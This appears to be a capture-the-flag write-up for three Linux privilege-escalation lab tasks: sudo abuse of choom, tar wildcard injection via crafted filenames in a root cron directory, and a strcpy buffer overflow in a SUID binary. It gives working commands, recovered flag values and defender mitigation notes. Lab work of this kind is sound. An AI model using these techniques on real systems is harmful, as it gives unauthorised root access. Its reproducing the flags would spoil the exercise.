# 0x01 Linux Privilege Escalation

Cyber Shell 0x02 — Linux privilege escalation tasks.  
Default access: `ssh user@<target-ip>` (password: `user`)

| Task | Technique | Flag file |
|------|-----------|-----------|
| 1 | Sudo misconfiguration (`choom`) | `0-flag.txt` |
| 2 | Cron + writable path + `tar` wildcards | `1-flag.txt` |
| 3 | SUID binary buffer overflow (`/home/user/service`) | `2-flag.txt` |

---

# Task 1 — Sudo + `choom`

## Objective

Gain root and read `/root/flag.txt`.

**Hint:** Focus on user permissions and available sudo commands. Leverage `choom` with sudo.

## Enumeration

```bash
whoami
id
sudo -l
choom --help
```

Critical finding:

```text
User user may run the following commands:
    (ALL) NOPASSWD: /usr/bin/choom
```

`choom` can run a command while adjusting the OOM score:

```text
choom -n number command [args...]
```

With passwordless sudo, that child command runs as **root**.

## Exploitation

```bash
# Confirm root
sudo /usr/bin/choom -n 0 id

# Read flag
sudo /usr/bin/choom -n 0 cat /root/flag.txt

# Optional root shell (use -- so child options are not parsed by choom)
sudo /usr/bin/choom -n 0 -- /bin/bash
```

## Flag (Task 1)

```text
24acbe7f1dcbe1d34dfe5d6117cf4d6b
```

Stored in `0-flag.txt`.

## Why it works

| Step | Detail |
|------|--------|
| Misconfiguration | `NOPASSWD: /usr/bin/choom` |
| Abuse | `choom -n 0 <cmd>` executes `<cmd>` as the sudo user (root) |
| Result | Arbitrary command execution as root |

---

# Task 2 — Cron + `tar` wildcard injection

## Objective

Gain root via misconfigured cron / writable content executed as root, then read `/root/flag.txt`.

**Vulnerable area:** Misconfigured cron jobs or writable scripts/content used by cron as root.  
**Key fact:** The directory the root cron job operates on is writable by `user`.

## Enumeration

### 1. Identity & sudo

```bash
whoami
id
sudo -l
```

No useful passwordless sudo for this task (sudo may prompt for a password).

### 2. Processes

```bash
ps aux
```

Note `cron` running as root — scheduled jobs may elevate.

### 3. Cron jobs (critical)

```bash
cat /etc/crontab
ls -la /etc/cron*
ls -la /etc/cron.d/
cat /etc/cron.d/*
crontab -l
ls -la /var/spool/cron/crontabs 2>/dev/null
```

Critical finding in `/etc/cron.d/my-cron-job`:

```text
* * * * * root (cd /home/user/dropbox; /usr/bin/tar -czf /tmp/dropbox_backup.tar.gzz *) 2>&1
```

| Observation | Why it matters |
|-------------|----------------|
| Runs **every minute** | Fast feedback loop |
| User is **root** | Anything tar does is root-level |
| CWD is `/home/user/dropbox` | Owned/writable by `user` |
| Command uses shell wildcard `*` | Filenames become extra arguments to `tar` |

### 4. Writable path

```bash
ls -la /home/user/dropbox
find /home/user -writable
```

`/home/user/dropbox` is writable by the low-priv user → we control the names expanded by `*`.

## Exploitation — `tar` wildcard / checkpoint injection

When the shell expands `*`, filenames starting with `-` are passed to `tar` as **options**, not archive members. GNU `tar` supports:

- `--checkpoint=1`
- `--checkpoint-action=exec=<command>`

So we plant option-looking filenames and a payload script:

```bash
cd /home/user/dropbox

# Payload executed as root by tar
cat > shell.sh << 'EOF'
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
cat /root/flag.txt > /tmp/pwned_flag.txt
chmod 644 /tmp/pwned_flag.txt
EOF

# Filenames that become tar options after glob expansion
echo > '--checkpoint=1'
echo > '--checkpoint-action=exec=sh shell.sh'

ls -la
```

Effective command after cron runs (conceptually):

```bash
tar -czf /tmp/dropbox_backup.tar.gzz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh ...
```

Wait up to ~1 minute for cron, then:

```bash
cat /tmp/pwned_flag.txt
# or
/tmp/rootbash -p -c 'id; cat /root/flag.txt'
```

Cleanup (optional, good hygiene after CTF):

```bash
rm -f /home/user/dropbox/--checkpoint=1 \
      /home/user/dropbox/'--checkpoint-action=exec=sh shell.sh' \
      /home/user/dropbox/shell.sh
```

## Flag (Task 2)

```text
799c121a66af83890c716cfd0c0ad5aa
```

(`/root/flag.txt` content was: `your flag is 799c121a66af83890c716cfd0c0ad5aa`)  
Stored in `1-flag.txt`.

## Why it works

```text
Root cron every minute
  -> cd /home/user/dropbox (user-writable)
  -> tar ... *   (shell expands attacker-controlled names)
  -> names like --checkpoint-action=exec=... run as root
  -> SUID bash / flag dump
```

## Mitigation (defender notes)

1. Never run cron as root over **user-writable** directories.
2. Avoid unquoted wildcards in privileged scripts; use explicit file lists or `find` with safe handling.
3. Prefer absolute paths and fixed arguments; do not let untrusted filenames become CLI options.
4. Harden backups: run as a dedicated low-priv user, write only to safe destinations, and drop privileges early.
5. Audit: `grep -R . /etc/cron* /var/spool/cron` and check ownership of every path those jobs touch.

---

# Task 3 — SUID binary buffer overflow

## Objective

Identify misconfigured SUID binaries, exploit a vulnerability, gain root, and read `/root/flag.txt`.

**Hint:** SUID binaries run with the file owner's privileges (often root). Misconfigurations, unchecked input, or buffer overflows can escalate privileges.

## Enumeration

### 1. Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
# also useful:
find / -perm -2000 -type f 2>/dev/null   # SGID
```

Notable findings:

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
...
/home/user/service          # custom SUID binary — high interest
```

### 2. Inspect the custom binary

```bash
ls -la /home/user/service
# -rwsr-xr-x 1 root root ... /home/user/service

file /home/user/service
strings /home/user/service
ldd /home/user/service
```

Interesting strings:

```text
Usage: %s <input>
strcpy
system
setuid
setgid
strcmp
11111111
22222222
/bin/bash
```

### 3. Behavioral / static analysis

```bash
/home/user/service
# Usage: /home/user/service <input>

/home/user/service test
# Buffer: test
# e: 1
# s: 1
# t: 2

objdump -d /home/user/service | sed -n '/<main>:/,/^$/p'
objdump -s -j .rodata /home/user/service
```

Logic reconstructed from `main`:

1. Stack password initialized to `"11111111"`.
2. `argv[1]` is copied with **`strcpy`** into a small stack buffer at `rbp-0x70` (no bounds check).
3. Character frequencies of the input are printed.
4. Stack password is compared with **`"22222222"`** via `strcmp`.
5. On match: `setuid(0)`, `setgid(0)`, `system("/bin/bash")`.

Because the password is initialized to `11111111`, a normal input never matches `22222222` — unless **`strcpy` overflows** and overwrites the adjacent password buffer.

### Stack layout (relevant)

```text
rbp-0x70  : input buffer  (strcpy destination)
...
rbp-0x21  : password[9]   (initially "11111111\0")
```

Distance: `0x70 - 0x21 = 0x4f = 79` bytes of padding before the password.

## Exploitation

Overwrite the stack password so it becomes `22222222`:

```bash
# Interactive root shell
/home/user/service $(python3 -c 'print("A"*79 + "22222222")')

# Or non-interactive:
python3 -c 'import os; os.execv("/home/user/service", ["/home/user/service", "A"*79 + "22222222"])'
# then in the root shell:
id
cat /root/flag.txt
```

Confirmed:

```text
uid=0(root) gid=0(root) groups=0(root),1000(user)
your flag is 6a15b12e63b957ca8d4ffd8fb7e2d292
```

One-liner payload sketch:

```bash
python3 -c 'print("A"*79 + "22222222")' | xargs -I{} /home/user/service {}
# better with exec for a real TTY shell:
/home/user/service "$(python3 -c 'print("A"*79+"22222222")')"
```

## Flag (Task 3)

```text
6a15b12e63b957ca8d4ffd8fb7e2d292
```

(`/root/flag.txt` content was: `your flag is 6a15b12e63b957ca8d4ffd8fb7e2d292`)  
Stored in `2-flag.txt`.

## Why it works

| Issue | Detail |
|-------|--------|
| SUID root | Binary runs with euid=0 |
| Unbounded `strcpy` | Attacker-controlled length into fixed stack buffer |
| Adjacent secret | Password lives next to the buffer on the stack |
| Privileged spawn | Match → `setuid(0)` + `system("/bin/bash")` |

Classic **stack-based buffer overflow** on a **SUID** helper to overwrite a local password check.

## Mitigation (defender notes)

1. Avoid custom SUID binaries; prefer capability-scoped helpers or sudo with narrow rules.
2. Never use `strcpy` / `gets` / `sprintf` — use `strncpy`, `strlcpy`, or safer APIs with length checks.
3. Enable compiler hardening: stack canaries (`-fstack-protector-strong`), PIE, FORTIFY_SOURCE, RELRO.
4. Audit periodically: `find / -perm -4000 -type f 2>/dev/null`.
5. If a privileged check is required, keep secrets out of overflowable stack buffers (and do not embed weak static passwords).

---

# Quick reference

### Task 1

```bash
sudo /usr/bin/choom -n 0 cat /root/flag.txt
```

### Task 2

```bash
cd /home/user/dropbox
echo 'cat /root/flag.txt > /tmp/pwned_flag.txt; chmod 644 /tmp/pwned_flag.txt' > shell.sh
echo > '--checkpoint=1'
echo > '--checkpoint-action=exec=sh shell.sh'
# wait ~1 min
cat /tmp/pwned_flag.txt
```

### Task 3

```bash
/home/user/service "$(python3 -c 'print("A"*79 + "22222222")')"
# root shell -> cat /root/flag.txt
```
